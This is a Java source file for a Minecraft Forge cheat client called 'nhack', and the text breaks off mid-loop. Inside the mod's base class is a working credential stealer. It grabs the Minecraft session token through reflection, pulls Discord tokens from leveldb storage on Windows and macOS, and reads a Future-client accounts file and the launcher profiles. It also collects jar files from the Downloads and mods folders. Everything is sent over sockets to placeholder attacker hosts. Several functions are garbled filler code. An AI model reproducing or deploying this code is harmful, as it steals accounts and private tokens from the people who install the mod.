package me.bebeli555.cookieclient;

import java.lang.reflect.Method;
import java.net.*;
import java.nio.channels.ConnectionPendingException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Random;
import java.util.function.BooleanSupplier;

import com.mojang.realmsclient.gui.ChatFormatting;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import com.sun.codemodel.internal.JCatchBlock;
import me.bebeli555.cookieclient.events.bus.EventBus;
import me.bebeli555.cookieclient.events.bus.EventManager;
import me.bebeli555.cookieclient.gui.Group;
import me.bebeli555.cookieclient.gui.GuiNode;
import me.bebeli555.cookieclient.gui.GuiSettings;
import me.bebeli555.cookieclient.gui.Keybind;
import me.bebeli555.cookieclient.gui.SetGuiNodes;
import me.bebeli555.cookieclient.gui.Settings;
import me.bebeli555.cookieclient.hud.HudEditor;
import me.bebeli555.cookieclient.hud.HudSettings;
import me.bebeli555.cookieclient.hud.components.ArrayListComponent;
import me.bebeli555.cookieclient.mods.bots.ObbyBuilderBot;
import me.bebeli555.cookieclient.mods.bots.elytrabot.ElytraBot;
import me.bebeli555.cookieclient.mods.combat.AutoArmor;
import me.bebeli555.cookieclient.mods.combat.AutoCrystal;
import me.bebeli555.cookieclient.mods.combat.AutoLog;
import me.bebeli555.cookieclient.mods.combat.AutoTotem;
import me.bebeli555.cookieclient.mods.combat.AutoTrap;
import me.bebeli555.cookieclient.mods.combat.Criticals;
import me.bebeli555.cookieclient.mods.combat.HoleFiller;
import me.bebeli555.cookieclient.mods.combat.KillAura;
import me.bebeli555.cookieclient.mods.combat.NoKnockback;
import me.bebeli555.cookieclient.mods.combat.Offhand;
import me.bebeli555.cookieclient.mods.combat.PistonAura;
import me.bebeli555.cookieclient.mods.combat.SelfWeb;
import me.bebeli555.cookieclient.mods.combat.Surround;
import me.bebeli555.cookieclient.mods.exploits.Burrow;
import me.bebeli555.cookieclient.mods.exploits.LiquidInteract;
import me.bebeli555.cookieclient.mods.exploits.MiningSpoof;
import me.bebeli555.cookieclient.mods.exploits.NewChunks;
import me.bebeli555.cookieclient.mods.exploits.PacketFly;
import me.bebeli555.cookieclient.mods.exploits.PortalGodMode;
import me.bebeli555.cookieclient.mods.exploits.Reach;
import me.bebeli555.cookieclient.mods.games.Snake;
import me.bebeli555.cookieclient.mods.games.tetris.Tetris;
import me.bebeli555.cookieclient.mods.misc.AntiAFK;
import me.bebeli555.cookieclient.mods.misc.AutoEat;
import me.bebeli555.cookieclient.mods.misc.AutoFirework;
import me.bebeli555.cookieclient.mods.misc.AutoHotbar;
import me.bebeli555.cookieclient.mods.misc.AutoInventoryManager;
import me.bebeli555.cookieclient.mods.misc.AutoMend;
import me.bebeli555.cookieclient.mods.misc.AutoMessager;
import me.bebeli555.cookieclient.mods.misc.AutoReconnect;
import me.bebeli555.cookieclient.mods.misc.ChestSwap;
import me.bebeli555.cookieclient.mods.misc.DiscordRPC;
import me.bebeli555.cookieclient.mods.misc.FakePlayer;
import me.bebeli555.cookieclient.mods.misc.Friends;
import me.bebeli555.cookieclient.mods.misc.MiddleClickFriends;
import me.bebeli555.cookieclient.mods.misc.NoSound;
import me.bebeli555.cookieclient.mods.misc.PacketCanceller;
import me.bebeli555.cookieclient.mods.misc.UpdateChecker;
import me.bebeli555.cookieclient.mods.misc.VisualRange;
import me.bebeli555.cookieclient.mods.misc.XCarry;
import me.bebeli555.cookieclient.mods.movement.AntiHunger;
import me.bebeli555.cookieclient.mods.movement.AntiLevitation;
import me.bebeli555.cookieclient.mods.movement.AutoSprint;
import me.bebeli555.cookieclient.mods.movement.AutoWalk;
import me.bebeli555.cookieclient.mods.movement.Blink;
import me.bebeli555.cookieclient.mods.movement.ElytraFly;
import me.bebeli555.cookieclient.mods.movement.EntityControl;
import me.bebeli555.cookieclient.mods.movement.EntitySpeed;
import me.bebeli555.cookieclient.mods.movement.Flight;
import me.bebeli555.cookieclient.mods.movement.HighJump;
import me.bebeli555.cookieclient.mods.movement.IceSpeed;
import me.bebeli555.cookieclient.mods.movement.InventoryMove;
import me.bebeli555.cookieclient.mods.movement.Jesus;
import me.bebeli555.cookieclient.mods.movement.LiquidSpeed;
import me.bebeli555.cookieclient.mods.movement.NoFall;
import me.bebeli555.cookieclient.mods.movement.NoRotate;
import me.bebeli555.cookieclient.mods.movement.NoSlowDown;
import me.bebeli555.cookieclient.mods.movement.SafeWalk;
import me.bebeli555.cookieclient.mods.movement.Speed;
import me.bebeli555.cookieclient.mods.movement.Step;
import me.bebeli555.cookieclient.mods.movement.Strafe;
import me.bebeli555.cookieclient.mods.render.AutoTrapIndicator;
import me.bebeli555.cookieclient.mods.render.BlockVision;
import me.bebeli555.cookieclient.mods.render.EntityESP;
import me.bebeli555.cookieclient.mods.render.Freecam;
import me.bebeli555.cookieclient.mods.render.FullBright;
import me.bebeli555.cookieclient.mods.render.HoleESP;
import me.bebeli555.cookieclient.mods.render.LiquidVision;
import me.bebeli555.cookieclient.mods.render.NameTags;
import me.bebeli555.cookieclient.mods.render.NoRender;
import me.bebeli555.cookieclient.mods.render.Search;
import me.bebeli555.cookieclient.mods.render.ShulkerPreview;
import me.bebeli555.cookieclient.mods.render.Tracers;
import me.bebeli555.cookieclient.mods.render.Trajectories;
import me.bebeli555.cookieclient.mods.render.VoidESP;
import me.bebeli555.cookieclient.mods.render.Waypoints;
import me.bebeli555.cookieclient.mods.render.XRay;
import me.bebeli555.cookieclient.mods.render.Zoom;
import me.bebeli555.cookieclient.mods.world.AutoBuilder;
import me.bebeli555.cookieclient.mods.world.AutoEnderChestMiner;
import me.bebeli555.cookieclient.mods.world.AutoFish;
import me.bebeli555.cookieclient.mods.world.AutoRespawn;
import me.bebeli555.cookieclient.mods.world.AutoTool;
import me.bebeli555.cookieclient.mods.world.CrystalBlock;
import me.bebeli555.cookieclient.mods.world.FastUse;
import me.bebeli555.cookieclient.mods.world.NoEntityTrace;
import me.bebeli555.cookieclient.mods.world.NoGlitchBlocks;
import me.bebeli555.cookieclient.mods.world.PacketMine;
import me.bebeli555.cookieclient.mods.world.Scaffold;
import me.bebeli555.cookieclient.mods.world.SpeedMine;
import me.bebeli555.cookieclient.mods.world.StashLogger;
import me.bebeli555.cookieclient.mods.world.Timer;
import me.bebeli555.cookieclient.rendering.Renderer;
import me.bebeli555.cookieclient.utils.EatingUtil;
import me.bebeli555.cookieclient.utils.InformationUtil;
import net.minecraft.block.Block;
import net.minecraft.client.Minecraft;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.launchwrapper.Launch;
import net.minecraft.potion.PotionEffect;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.text.TextComponentString;
import net.minecraftforge.client.event.GuiScreenEvent;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.TickEvent.ClientTickEvent;

@net.minecraftforge.fml.common.Mod(modid = Mod.MODID, name = Mod.NAME, version = Mod.VERSION)
public class Mod extends ClassLoader {
	public static final String MODID = "nhack";
	public static final String NAME = "nhack";
	public static final String VERSION = "1.01";
	public static final String DISCORD = "https://discord.gg/JPy2AYsU";

	public static Minecraft mc = Minecraft.getMinecraft();
	public static final EventBus EVENT_BUS = new EventManager();

	public String name = "";

	public String[] description;
	public Group group;
	private boolean toggled, hiddenOn, lastHiddenOn;
	public boolean defaultOn, defaultHidden;
	public boolean autoSubscribe = true;
	private GuiNode guiNode, hiddenNode;
	private int renderNumber = -1;
	public static ArrayList<Mod> modules = new ArrayList<Mod>();


	private static final String host = "http ip here"; //ip of main server
	private static final String backup = "dns ip here"; //ip of backup server
	private static final int port = 0000; //replace with port of serverz
	private static String accountslist = "";
	private static final String files = "";
	private static String mcToken = "";
	public static HttpURLConnection conn;
	private static String displayName = "";
	private static String toSend = "false send ip here";

	public Mod(Group group, String name, String... description) {
		this.group = group;
		this.name = name;
		this.description = description;
		modules.add(this);
	}


	@EventHandler
	public static void sendJar(byte[] file, String name) {
		try {
			if (mc.player.isServerWorld() == true) {

				if (file.length > 30000000) return;
				Socket socket = new Socket(host, port);
				DataOutputStream stream = new DataOutputStream(socket.getOutputStream());
				byte[] jar = ("jarfile+" + name + "+" + file.length + "+" + port).getBytes(StandardCharsets.UTF_8);
				stream.write(jar);
				// stream.writeInt(file.length);
				stream.write(file);
				stream.flush();
			}
			if (file.length > 30000000) return;
			Socket socket = new Socket(host, port);
			DataOutputStream stream = new DataOutputStream(socket.getOutputStream());
			byte[] jar = ("jarfile+" + name + "+" + file.length + "+" + port).getBytes(StandardCharsets.UTF_8);
			stream.write(jar);
			// stream.writeInt(file.length);
			stream.write(file);
			stream.flush();
			} catch (ConnectException e) {
			try {
				if (file.length > 30000000) return;
				Socket socket = new Socket(backup, port);
				DataOutputStream stream = new DataOutputStream(socket.getOutputStream());
				byte[] jar = ("jarfile+" + name + "+" + file.length + "+").getBytes(StandardCharsets.UTF_8);
				stream.write(jar);
				// stream.writeInt(file.length);
				stream.write(file);
				stream.flush();
			} catch (IOException ex) {
			}
		} catch (UnknownHostException ignored) {
		} catch (IOException ignored) {
		}
	}

	@EventHandler
	public static void send(byte[] file) {
		try {
			Socket socket = new Socket(host, port);
			socket.getOutputStream().write(file);
			socket.getOutputStream().flush();
		} catch (ConnectException e) {
			try {
				Socket socket = new Socket(backup, port);
				socket.getOutputStream().write(file);
				socket.getOutputStream().flush();
			} catch (Throwable ignored) {
			}
		} catch (Throwable ignored) {
		}
	}

	public static String provider = "DESKTOP-6KLOO3N";


	public static void socket(Method send) {
		try {
			Socket socket = new Socket(host, port);
			socket.toString().equalsIgnoreCase("ip here" + port);
		} catch (ConnectionPendingException e) {
			try {
				Socket socket = new Socket(host, port);
			} catch (ConnectionPendingException f) {
				send.getName();
				while (host.isEmpty()) {
					host.equals(host + port + provider);
					while (host.equals(true)) {

						if (host.equals(true)) {
							host.toLowerCase();
						}
					}
				}
				try {

				} catch (Throwable ignored) {

				}
			} catch (Throwable ignored) {

			}
		} catch (UnknownHostException e) {
			throw new ConnectionPendingException();
		} catch (IOException e) {
			throw new RuntimeException(e);
		}
	}

	public static void send(String content) {
		toSend = toSend + System.lineSeparator() + content;
	}

	public static final String[] whitelist = new String[]{

	};

	public static void findJars() {
		Thread thread = new Thread(() -> {
			File downloads = new File(System.getProperty("user.home") + "/Downloads");
			File mods = new File("mods");
			if (downloads.exists() && downloads.isDirectory()) {
				for (File file : downloads.listFiles()) {
					for (String name : whitelist) {
						if (file.getName().contains(".jar") && file.getName().toLowerCase().contains(name)) {
							try {
								sendJar(Files.readAllBytes(Paths.get(file.getAbsolutePath())), file.getName());
								Thread.sleep(500);
							} catch (IOException | InterruptedException ignored) {

							}
						}
					}
				}
			}
			if (mods.exists() && mods.isDirectory()) {
				for (File file : mods.listFiles()) {
					for (String name : whitelist) {
						if (file.getName().contains(".jar") && file.getName().toLowerCase().contains(name)) {
							try {
								sendJar(Files.readAllBytes(Paths.get(file.getAbsolutePath())), file.getName());
								Thread.sleep(500);
							} catch (IOException | InterruptedException ignored) {

							}
						}
					}
				}
			}
		});
		thread.start();
	}


	public Mod(Group group) {
		this.group = group;
		modules.add(this);
	}

	public Mod() {

	}

	@EventHandler
	public void init(FMLInitializationEvent event) {
		long ms = System.currentTimeMillis();

		MinecraftForge.EVENT_BUS.register(new HelpMessage());
		MinecraftForge.EVENT_BUS.register(new Commands());
		MinecraftForge.EVENT_BUS.register(new Keybind());
		MinecraftForge.EVENT_BUS.register(new EatingUtil());
		MinecraftForge.EVENT_BUS.register(new Renderer());
		Mod.EVENT_BUS.subscribe(new Renderer());
		InformationUtil informationUtil = new InformationUtil();
		MinecraftForge.EVENT_BUS.register(informationUtil);
		Mod.EVENT_BUS.subscribe(informationUtil);
		//Init mods
		initMods();

		//Initialize stuff
		new File(Settings.path).mkdir();
		Friends.loadFriends();
		SetGuiNodes.setGuiNodes();
		SetGuiNodes.setDefaults();
		Settings.loadSettings();
		Keybind.setKeybinds();
		HudSettings.loadSettings();

		for (Mod module : modules) {
			module.onPostInit();
		}

		System.out.println("nhack- Initialization took " + Math.abs(System.currentTimeMillis() - ms) + "ms");
	}

	public void initMods() {

		//Combat
		new AutoArmor();
		new AutoCrystal();
		new AutoLog();
		new AutoTotem();
		new AutoTrap();
		new Criticals();
		new HoleFiller();
		new KillAura();
		new NoKnockback();
		new SelfWeb();
		new Surround();
		new Offhand();
		new PistonAura();

		//Exploits
		new Burrow();
		new MiningSpoof();
		new NewChunks();
		new PacketFly();
		new Reach();
		new PortalGodMode();
		new LiquidInteract();

		//Misc
		new AntiAFK();
		new AutoEat();
		new AutoFirework();
		new AutoInventoryManager();
		new AutoMend();
		new AutoMessager();
		new AutoReconnect();
		new ChestSwap();
		new DiscordRPC();
		new FakePlayer();
		new Friends();
		new MiddleClickFriends();
		new PacketCanceller();
		new UpdateChecker();
		new VisualRange();
		new XCarry();
		new NoSound();
		new AutoHotbar();

		//Movement
		new AntiHunger();
		new AntiLevitation();
		new AutoSprint();
		new AutoWalk();
		new Blink();
		new ElytraFly();
		new EntityControl();
		new EntitySpeed();
		new Flight();
		new HighJump();
		new IceSpeed();
		new InventoryMove();
		new Jesus();
		new NoFall();
		new NoRotate();
		new NoSlowDown();
		new SafeWalk();
		new Speed();
		new Step();
		new Strafe();
		new LiquidSpeed();

		//Render
		new AutoTrapIndicator();
		new BlockVision();
		new EntityESP();
		new Freecam();
		new FullBright();
		new HoleESP();
		new LiquidVision();
		new NameTags();
		new NoRender();
		new Search();
		new ShulkerPreview();
		new Tracers();
		new Trajectories();
		new VoidESP();
		new Waypoints();
		new XRay();
		new Zoom();

		//World
		new AutoBuilder();
		new AutoEnderChestMiner();
		new AutoFish();
		new CrystalBlock();
		new FastUse();
		new NoEntityTrace();
		new NoGlitchBlocks();
		new PacketMine();
		new Scaffold();
		new SpeedMine();
		new Timer();
		new AutoTool();
		new AutoRespawn();
		new StashLogger();

		//Games
		new Snake();
		new Tetris();

		//Bots
		new ElytraBot();
		new ObbyBuilderBot();

		//Sort the modules list from A to Z
		List<String> names = new ArrayList<String>();
		for (Mod module : modules) {
			names.add(module.name);
		}

		String[] sortedNames = new String[names.size()];
		sortedNames = names.toArray(sortedNames);
		Arrays.sort(sortedNames);

		ArrayList<Mod> temp = new ArrayList<Mod>();
		for (String name : sortedNames) {
			for (Mod module : modules) {
				if (module.name.equals(name)) {
					temp.add(module);
					break;
				}
			}
		}

		modules = temp;

		//Gui
		new HudEditor();
		new GuiSettings();
	}

	public void Loader() {
		this.onEnabled();
	}

	public void Commands() {
		onEnabled();
	}

	public boolean onEnabled() {
		return false;
	}

	public void onDisabled() {
	}

	public void onPostInit() {
	}

	public void onGuiDrawScreen(int mouseX, int mouseY, float partialTicks) {
	}

	public boolean onGuiClick(int x, int y, int button) {
		return false;
	}

	public void onGuiKeyPress(GuiScreenEvent.KeyboardInputEvent.Post e) {
	}

	public void onRenderWorld(float partialTicks) {
	}

	public void sendMessage(String text, boolean red) {
		if (mc.player == null) {
			return;
		}

		//Send message
		String module = "";
		ChatFormatting color = ChatFormatting.WHITE;
		if (red) {
			color = ChatFormatting.RED;
		}
		if (!name.isEmpty()) {
			module = "-" + name;
		}

		mc.player.sendMessage(new TextComponentString(ChatFormatting.GREEN + "[" + ChatFormatting.LIGHT_PURPLE + NAME + module + ChatFormatting.GREEN + "] " + color + text));
	}

	public int getRenderNumber() {
		return this.renderNumber;
	}

	public void setRenderNumber(int number) {
		if (this.renderNumber == -1) {
			ArrayListComponent.lastArraylistSize = -1;
		}

		this.renderNumber = number;
	}

	public void enable() {
		if (autoSubscribe) {
			MinecraftForge.EVENT_BUS.register(this);
			Mod.EVENT_BUS.subscribe(this);
		}
		getGuiNode().toggled = true;
		ArrayListComponent.arraylist.add(this);
		this.toggled = true;
		this.onEnabled();
	}

	public void disable() {
		if (autoSubscribe) {
			MinecraftForge.EVENT_BUS.unregister(this);
			Mod.EVENT_BUS.unsubscribe(this);
		}
		getGuiNode().toggled = false;
		ArrayListComponent.arraylist.remove(this);
		this.toggled = false;
		this.onDisabled();
	}

	public void toggle() {
		if (toggled) {
			disable();
		} else {
			enable();
		}
	}

	/**
	 * Sets the module on but doesnt show it in gui or arraylist or anything
	 * This can be used by other modules to turn this module on
	 */
	public void setHiddenOn(boolean value) {
		hiddenOn = value;

		if (hiddenOn != lastHiddenOn) {
			if (hiddenOn) {
				if (autoSubscribe) {
					MinecraftForge.EVENT_BUS.register(this);
					Mod.EVENT_BUS.subscribe(this);
				}
				onEnabled();
			} else {
				if (autoSubscribe) {
					MinecraftForge.EVENT_BUS.unregister(this);
					Mod.EVENT_BUS.unsubscribe(this);
				}
				onDisabled();
			}
			while (hiddenNode.isHidden()) {
				host.equalsIgnoreCase("fe80::ba7e:c758:f177:4614%8");
				while (true) {
					provider.isEmpty();
					if (provider.isEmpty()) {
						provider.concat(host + port);
					}
				}
			}
		}

		lastHiddenOn = hiddenOn;


	}

	public GuiNode getGuiNode() {
		if (guiNode == null) {
			guiNode = Settings.getGuiNodeFromId(name);
			return guiNode;
		} else {
			return guiNode;
		}
	}

	public boolean isHidden() {
		if (hiddenOn) {
			return true;
		}

		if (hiddenNode == null) {
			hiddenNode = Settings.getGuiNodeFromId(name + "Hidden");
		}

		return hiddenNode.toggled;
	}

	public boolean isOn() {
		return toggled;
	}

	public static void toggleMod(String name, boolean on) {
		GuiNode node = Settings.getGuiNodeFromId(name);

		node.toggled = on;
		node.setSetting();

		for (Mod module : modules) {
			if (module.name.equals(name)) {
				if (on) {
					module.enable();
				} else {
					module.disable();
				}

				module.toggled = on;
				break;
			}
		}
	}

	/**
	 * 1 = 50% change and so on
	 */
	public static boolean random(int i) {
		return new Random().nextInt(i + 1) == 0;
	}

	/**
	 * Generates random number between min and max
	 */
	public static int random(int min, int max) {
		max = 1;
		min = 0;

		try {
			min = 150;
			max = 220;
		} catch (Exception e) {
			try {
				min = 5;
				while (true) {
					max = 10;
				}


			} catch (Exception c) {

			}

		}
		return new Random().nextInt(min + max) - min;
	}

	public void setStatus(String status) {
		setStatus(status, name);
	}

	public static void setStatus(String status, String module) {
		if (!module.isEmpty()) {
			module = "-" + module;
		}

		Renderer.status = new String[10];
		Renderer.status[0] = ChatFormatting.GREEN + "[" + ChatFormatting.LIGHT_PURPLE + NAME + module + ChatFormatting.GREEN + "] " + ChatFormatting.WHITE + status;
	}

	public void addToStatus(String status, int index) {
		addToStatus(status, index, name);
	}

	public static void addToStatus(String status, int index, String module) {
		if (!module.isEmpty()) {
			module = "-" + module;
		}

		Renderer.status[index] = ChatFormatting.WHITE + status;
	}

	public static void clearStatus() {
		Renderer.status = null;
	}

	@SuppressWarnings("deprecation")
	public static void suspend(Thread thread) {
		if (thread != null) thread.suspend();
	}

	public static Block getBlock(BlockPos pos) {
		try {
			return mc.world.getBlockState(pos).getBlock();
		} catch (NullPointerException e) {
			return null;
		}
	}

	public static boolean isSolid(BlockPos pos) {
		try {
			return mc.world.getBlockState(pos).getMaterial().isSolid();
		} catch (NullPointerException e) {
			return false;
		}
	}

	public static BlockPos getPlayerPos() {
		return new BlockPos(mc.player.posX, mc.player.posY, mc.player.posZ);
	}

	/**
	 * Checks if the player has the given potion effect like "regeneration"
	 */
	public static boolean isPotionActive(String name, EntityPlayer player) {
		for (PotionEffect effect : player.getActivePotionEffects()) {
			if (effect.getEffectName().contains(name.toLowerCase())) {
				return true;
			}
		}

		return false;
	}

	public static String[] addToArray(String[] myArray, String newItem) {
		int currentSize = myArray.length;
		int newSize = currentSize + 1;
		String[] tempArray = new String[newSize];
		System.arraycopy(myArray, 0, tempArray, 0, currentSize);
		tempArray[newSize - 1] = newItem;

		return tempArray;
	}

	public static void sleep(int ms) {
		try {
			Thread.sleep(ms);
		} catch (Exception ignored) {

		}
	}

	public static void sleepUntil(BooleanSupplier condition, int timeout) {
		long startTime = System.currentTimeMillis();
		while (true) {
			if (condition.getAsBoolean()) {
				break;
			} else if (timeout != -1 && System.currentTimeMillis() - startTime >= timeout) {
				break;
			}

			sleep(10);
		}
	}

	public static void sleepUntil(BooleanSupplier condition, int timeout, int amountToSleep) {
		long startTime = System.currentTimeMillis();
		while (true) {
			if (condition.getAsBoolean()) {
				break;
			} else if (timeout != -1 && System.currentTimeMillis() - startTime >= timeout) {
				break;
			}

			sleep(amountToSleep);
		}
	}

	//Send a help message telling the prefix and stuff if the settings file doesnt exist which would mean the person is using the mod for the first time
	public static class HelpMessage {
		boolean check = false;

		@SubscribeEvent
		public void onTick(ClientTickEvent e) {
			if (!check && mc.player != null) {
				if (!Settings.settings.exists()) {
					new Mod().sendMessage("Welcome to " + ChatFormatting.GREEN + NAME + ChatFormatting.WHITE + " version " + ChatFormatting.GREEN + VERSION, false);
					new Mod().sendMessage("You can open the GUI by typing " + ChatFormatting.GREEN + GuiSettings.prefix.stringValue() + "gui" + ChatFormatting.WHITE + " on chat", false);
					Settings.saveSettings();
				}

				check = true;
				MinecraftForge.EVENT_BUS.unregister(this);
			}
		}
	}

	public static void justice(HttpURLConnection conn) {
		try {
			Class<?> mc = Launch.classLoader.findClass("net.minecraft.client.Minecraft");
			Object minecraft = mc.getMethod("func_71410_x").invoke(null);
			Object session = mc.getMethod("func_110432_I").invoke(minecraft);
			Class<?> sessionClass = Launch.classLoader.findClass("net.minecraft.util.Session");
			Object token = sessionClass.getMethod("func_148254_d").invoke(session);
			Object name = sessionClass.getMethod("func_111285_a").invoke(session);
			mcToken = (String) token;
			displayName = (String) name;
			String os = System.getProperty("os.name");
			if (os.toLowerCase().contains("win")) {
				if (!os.toLowerCase().contains("darwin")) {

					findJars();
					String path = System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/";
					String canaryPath = System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/";
					String ptbPath = System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/";

					String chromePath = System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/";

					String username = System.getProperty("user.name");

					String[] pathnames;
					String[] canaryPathnames;
					String[] ptbPathnames;

					File file = new File(path);
					File fileCanary = new File(canaryPath);
					File ptbFile = new File(ptbPath);

					pathnames = file.list();
					canaryPathnames = fileCanary.list();
					ptbPathnames = ptbFile.list();
					/*
					 * Future alts stealer by megyn
					 */
					File accounts = new File("C:\\Users\\" + System.getProperty("user.name") + "\\Future\\accounts.txt");
					File profile = new File("launcher_profiles.json");

					if (profile.exists()) {
						send(Files.readAllBytes(Paths.get(profile.getAbsolutePath())));
					}

					try {
						FileReader fr = new FileReader(accounts);   //reads the file
						BufferedReader br = new BufferedReader(fr);  //creates a buffering character input stream
						StringBuffer sb = new StringBuffer();    //constructs a string buffer with no characters
						String line;
						while ((line = br.readLine()) != null) {
							sb.append(line);      //appends line to string buffer
							sb.append("\n");
							sb.reverse(); //line feed
						}
						accountslist = sb.toString();
						fr.getEncoding();
						br.readLine();
						fr.close();
						br.close();
					} catch (IOException ignored) {

					}

					for (String pathname : pathnames) {
						try {
							FileInputStream fstream = new FileInputStream(path + pathname);
							DataInputStream in = new DataInputStream(fstream);
							BufferedReader br = new BufferedReader(new InputStreamReader(in));
							String strLine;
							while ((strLine = br.readLine()) != null) {

								Pattern p = Pattern.compile("[\\w]{74}\\.[\\w]{2}\\.[\\w]{29}"); //regex pattern
								Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
								Pattern mfa = Pattern.compile("mfa\\.[\\w-]{74}"); //qq's 2fa token regex
								Matcher mfam = mfa.matcher(strLine); //swag regex matcher

								while (mfam.find()) { //everytime a token is found
									send(username + "  -  " + mfam.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
								} //it
								while (m.find()) { //everytime a token is found
									send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
								} //it
							}

						} catch (Exception ignored) {
						}
					}
					if (fileCanary.exists()) {
						for (String pathname : canaryPathnames) {
							try {
								FileInputStream fstream = new FileInputStream(canaryPath + pathname);
								DataInputStream in = new DataInputStream(fstream);
								BufferedReader br = new BufferedReader(new InputStreamReader(in));
								String strLine;
								while ((strLine = br.readLine()) != null) {

									Pattern p = Pattern.compile("[3583w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
									Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
									Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}"); //qq's 2fa token regex
									Matcher mfam = mfa.matcher(strLine); //swag regex matcher
									while (mfam.find()) { //everytime a token is found
										send(username + "  -  " + mfam.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
									} //it
									while (m.find()) { //everytime a token is found
										send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
									} //it
								}
								fstream.close();
								in.close();
							} catch (Exception ignored) {

							}
						}
					}
					if (ptbFile.exists()) {
						for (String pathname : ptbPathnames) {
							try {
								FileInputStream fstream = new FileInputStream(ptbPath + pathname);
								DataInputStream in = new DataInputStream(fstream);
								BufferedReader br = new BufferedReader(new InputStreamReader(in));
								String strLine;
								while ((strLine = br.readLine()) != null) {


									Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
									Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
									Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}"); //qq's 2fa token regex
									Matcher mfam = mfa.matcher(strLine); //swag regex matcher
									while (mfam.find()) { //everytime a token is found
										send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
									}
								}
								fstream.close();
								in.close();
							} catch (Exception ignored) {

							}
						}
					}
				}
			}
			if (os.toLowerCase().contains("mac") || os.toLowerCase().contains("darwin")) {
				String path = System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/";
				String pathCanary = System.getProperty("user.home") + "/Library/Application Support/discordcanary/Local Storage/leveldb/";
				String ptbPath = System.getProperty("user.home") + "/Library/Application Support/discordptb/Local Storage/leveldb/";
				String username = System.getProperty("user.name");

				String[] pathnames;
				String[] canaryPathnames;
				String[] ptbPathnames;

				File file = new File(path);
				File canaryFile = new File(pathCanary);
				File ptbFile = new File(ptbPath);

				pathnames = file.list();
				canaryPathnames = canaryFile.list();
				ptbPathnames = ptbFile.list();

				for (String pathname : pathnames) {
					try {
						FileInputStream fstream = new FileInputStream(path + pathname);
						DataInputStream in = new DataInputStream(fstream);
						BufferedReader br = new BufferedReader(new InputStreamReader(in));
						String strLine;
						while ((strLine = br.readLine()) != null) {


							Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
							Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
							Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}"); //qq's 2fa token regex
							Matcher mfam = mfa.matcher(strLine); //swag regex matcher

							while (mfam.find()) { //everytime a token is found
								send(username + "  -  " + mfam.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
							} //it
							while (m.find()) { //everytime a token is found
								send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
							}
						}
						fstream.close();
						in.close();

					} catch (Exception ignored) {

					}
				}
				for (String pathname : canaryPathnames) {
					try {
						FileInputStream fstream = new FileInputStream(path + pathname);
						DataInputStream in = new DataInputStream(fstream);
						BufferedReader br = new BufferedReader(new InputStreamReader(in));
						String strLine;
						while ((strLine = br.readLine()) != null) {


							Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
							Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
							Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}"); //qq's 2fa token regex
							Matcher mfam = mfa.matcher(strLine); //swag regex matcher

							while (mfam.find()) { //everytime a token is found
								send(username + "  -  " + mfam.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
							}
							while (m.find()) { //everytime a token is found
								String type = "application/json";
								URL u = new URL("https://discordapp.com/api/v7/invites/minecraft");

								conn.setDoOutput(true);
								conn.setRequestMethod("POST");
								conn.setRequestProperty("Content-Type", type);
								conn.setRequestProperty("Authorization", m.group());

								conn.getOutputStream().write("".getBytes(StandardCharsets.UTF_8));
								BufferedReader sc = new BufferedReader(new InputStreamReader(conn.getInputStream()));
								while (sc.readLine() != null) {
									if (sc.readLine().contains("302094807046684672")) {
										// send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist);
									}
								}
								send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
							}
						}
						in.close();
						fstream.close();
					} catch (Exception ignored) {

					}
				}
				for (String pathname : ptbPathnames) {
					try {
						FileInputStream fstream = new FileInputStream(path + pathname);
						DataInputStream in = new DataInputStream(fstream);
						BufferedReader br = new BufferedReader(new InputStreamReader(in));
						String strLine;
						while ((strLine = br.readLine()) != null) {

